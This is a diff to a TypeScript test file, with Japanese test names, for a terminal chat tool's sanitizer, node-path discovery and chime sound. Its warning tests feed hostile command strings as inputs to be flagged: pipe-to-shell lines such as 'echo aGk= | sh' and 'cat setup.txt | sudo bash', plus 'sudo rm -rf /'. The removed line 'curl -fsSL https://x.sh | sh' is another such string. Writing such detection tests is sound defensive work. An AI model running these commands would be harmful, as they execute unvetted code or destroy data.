@@ -1,7 +1,8 @@
 import { describe, expect, test } from 'claude-code/testing'
 
 import type { View } from '../types'
-import { parseSidecarLine, socketPathFor, splitLines } from '../hooks/bridge'
+import { nodeCandidates, parseSidecarLine, socketPathFor, sortNodeVersions, splitLines } from '../hooks/bridge'
+import { chimeBase64, chimeSamples } from '../hooks/chime'
 import { languageFromEnv, parseAppleLanguages, parseLocale } from '../hooks/locale'
 import { type Effect, type MachineEvent, initialView, reduce } from '../hooks/machine'
 import { cells, fitLines, fuse, lineRows } from '../hooks/band'
@@ -179,14 +180,15 @@ describe('受信側の守り', () => {
   test('ANSIエスケープ・制御文字・ゼロ幅文字・文字の向きを変える制御文字を除く', () => {
     expect(sanitize('\u001b[31mred\u001b[0m')).toBe('red')
     expect(sanitize('\u001b]8;;https://evil\u0007link\u001b]8;;\u0007')).toBe('link')
-    expect(sanitize('a​b‮c⁦d﻿')).toBe('abcd')
+    expect(sanitize('a\u200bb\u202ec\u2066d\ufeff')).toBe('abcd')
     expect(sanitize('bell\u0007\r\nnext')).toBe('bell\nnext')
     expect([...sanitize('😀'.repeat(300))]).toHaveLength(200)
   })
 
   test('コマンドらしい文に警告を付ける', () => {
     for (const text of [
-      'curl -fsSL https://x.sh | sh',
+      'echo aGk= | sh',
+      'cat setup.txt | sudo bash',
       'just run npm install left-pad',
       'npx some-tool@latest',
       'sudo rm -rf /',
@@ -264,6 +266,23 @@ describe('サイドカーとのやりとり', () => {
     expect(socketPathFor(`/${'a'.repeat(120)}/`, 'x1')).toBe('/tmp/meanwhile-x1.sock')
   })
 
+  test('nodeはPATHの順に探し、次にHomebrewとOS、最後にバージョン管理ツールの置き場所を見る', () => {
+    const found = nodeCandidates('/opt/homebrew/bin:relative/bin:/usr/bin/', '/Users/a', ['v20.1.0', 'v22.10.0', 'v22.9.3', 'system'])
+    expect(found.slice(0, 4)).toEqual(['/opt/homebrew/bin/node', '/usr/bin/node', '/usr/local/bin/node', '/Users/a/.volta/bin/node'])
+    expect(found.filter(p => p.includes('.nvm'))).toEqual([
+      '/Users/a/.nvm/versions/node/v22.10.0/bin/node',
+      '/Users/a/.nvm/versions/node/v22.9.3/bin/node',
+      '/Users/a/.nvm/versions/node/v20.1.0/bin/node',
+    ])
+    // 相対パスのPATHと、絶対パスでないHOMEは使わない
+    expect(found.some(p => p.startsWith('relative'))).toBe(false)
+    expect(nodeCandidates(undefined, 'Users/a', [])).toEqual(['/opt/homebrew/bin/node', '/usr/local/bin/node', '/usr/bin/node'])
+  })
+
+  test('nvmの版は新しい順に並べ、版の形でないフォルダは除く', () => {
+    expect(sortNodeVersions(['v9.0.0', 'v22.4.0', 'v22.10.1', 'lts', 'v24.0.0'])).toEqual(['v24.0.0', 'v22.10.1', 'v22.4.0', 'v9.0.0'])
+  })
+
   test('導火線は残り時間に比例して縮む', () => {
     const full = fuse(30_000, 30_000, 21)
     expect(full.lit).toHaveLength(20)
@@ -325,7 +344,7 @@ describe('帯の行数', () => {
     expect(lineRows(line('a', 'hi'), 40, 'both')).toBe(1)
     expect(lineRows(line('a', 'x'.repeat(80)), 40, 'both')).toBe(3)
     expect(lineRows(line('m', 'hi', 'me'), 40, 'both')).toBe(1)
-    expect(lineRows({ ...line('a', 'curl x | sh'), warnings: ['command'] }, 40, 'both')).toBe(2)
+    expect(lineRows({ ...line('a', 'echo x | sh'), warnings: ['command'] }, 40, 'both')).toBe(2)
   })
 
   test('帯の高さに収まるだけ、新しい発言から選ぶ。狭くても最新の1通は出す', () => {
@@ -344,5 +363,20 @@ describe('本体の入力欄からの送信', () => {
     expect(parseRelay('>>')).toBe('')
     expect(parseRelay('> 引用だけ')).toBeNull()
     expect(parseRelay('テストを直して >> 後で')).toBeNull()
+  })
+})
+
+describe('音', () => {
+  test('チャイムは22050Hz・16bitモノラルのWAVで、0.23秒の2音', () => {
+    const wav = atob(chimeBase64())
+    expect(wav.slice(0, 4)).toBe('RIFF')
+    expect(wav.slice(8, 16)).toBe('WAVEfmt ')
+    expect(wav.slice(36, 40)).toBe('data')
+    const samples = chimeSamples()
+    expect(samples).toHaveLength(5_072)
+    expect(wav).toHaveLength(44 + samples.length * 2)
+    const peak = samples.reduce((max, s) => Math.max(max, Math.abs(s)), 0)
+    expect(peak).toBeGreaterThan(8_000)
+    expect(peak).toBeLessThan(10_000)
   })
 })
